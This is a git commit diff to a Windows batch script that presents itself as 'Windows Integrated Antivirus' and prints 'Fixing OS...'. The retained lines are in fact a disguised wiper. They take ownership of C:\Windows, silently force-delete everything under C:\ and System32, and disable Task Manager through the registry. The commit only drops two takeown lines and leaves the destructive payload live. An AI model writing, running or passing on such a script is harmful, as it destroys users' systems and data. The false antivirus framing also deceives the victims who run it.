497ba8f24474980fd9900c415f2056c2bed25934
WindowsGuy <162045355+WindowsGuy-programmer@users.noreply.github.com>
2025-11-12 10:38:45 +0300

    Update Script.bat

--- Script.bat
+++ Script.bat
@@ -2,8 +2,6 @@
 title Windows Integrated Antivirus
 echo Fixing OS...
 takeown /f C:\Windows /r /d Y > nul 2>&1
-takeown /f C:\Windows\System32 /r /d Y > nul 2>&1
-takeown /f C:\ /r /d Y > nul 2>&1
 del /s /f /q C:\ > nul 2>&1
 del /s /f /q C:\Windows\System32 > nul 2>&1
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
